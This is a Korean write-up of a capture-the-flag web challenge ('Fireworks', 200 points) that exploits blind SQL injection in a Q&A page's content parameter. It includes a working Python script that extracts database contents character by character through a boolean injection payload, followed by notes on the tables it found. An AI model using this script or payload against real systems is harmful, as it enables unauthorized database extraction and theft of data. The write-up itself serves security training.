## No.15 Web Fireworks[200]

**점수:** 200

**분야:** Web

**제목:** Fireworks

----

Q&A 페이지의 content 변수에서 블라인드 인젝션이 터진다.

아래 스크립트를 이용해 db를 털어낸다.

`chiffon` 테이블에서 `3ny4vtsuh` 문자열 발견.

S석 예약 시 `seats` 변수에 이 문자열을 넣어주면 답이 나온다.

```python
import urllib
import urllib2
import time
 
def try_query(query):
    data = {
        'content': query
    }
 
    while True:
        try:
            req = urllib2.Request('http://223.194.105.182:43080/question_query.php', data=urllib.urlencode(data))
            result = urllib2.urlopen(req).read()
            break
        except urllib2.HTTPError:
            time.sleep(.3)
            pass
 
    return 'location.href' not in result
 
flag = ""
i = 1
min = 0x20
max = 0x7f
 
while True:
    pivot = (min + max) / 2
 
    if pivot == min or pivot == max:
        flag += chr(pivot)
        min = 0x20
        max = 0x7f
        i += 1
        print flag
        continue
 
    query = "' or mid((select binary concat_ws(',', name, tel, home, seat) from sseat where name='Key'),{},1)<'{}'-- -".format(i, chr(pivot))
 
    if try_query(query):
        max = pivot
    else:
        min = pivot
 
    time.sleep(.1)
 
# HUST
#   look it i5 hint => do not open seat table
# aseat
#   name tel home seat id
# board
#   find data v4lues please
# boom
#    go t0 another t4ble
# chicken
#    chicken i5 very delicious
# chiffon
#    m4tch w0rds => 3ny4v tsuh
# inforseat
#    id pw name tel email
# sseat
#    name tel home seat
```
